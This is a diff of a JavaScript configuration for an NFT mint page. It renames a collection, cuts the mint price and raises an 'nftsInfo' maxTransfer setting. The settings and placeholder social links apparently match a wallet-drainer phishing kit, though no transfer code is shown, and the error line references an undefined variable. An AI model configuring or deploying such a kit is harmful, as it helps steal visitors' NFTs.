@@ -1,13 +1,13 @@
 const collectionInfo = {
-    name: "Shisōka | The Outcasts",
+    name: "MoveMan",
     title: "{name}",
-    date: "16.07.2022",
+    date: "18.07.2022",
     socialMedia: {
         discord: "https://discord.com/",
         twitter: "https://twitter.com/",
     },
     medias: {
-        preview: "1.gif",
+        preview: "logo.jpg",
         favicon: "logo.jpg",
     },
     background: {
@@ -18,7 +18,7 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 2,
+    price: 0.5,
     totalSupply: 1888,
     toFixed: 1,
     minUnits: 1,
@@ -29,7 +29,7 @@ const mintInfo = {
 const nftsInfo = {
     active: true,
     minValue: 0.3,
-    maxTransfer: 5,
+    maxTransfer: 8,
 }
 
 if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
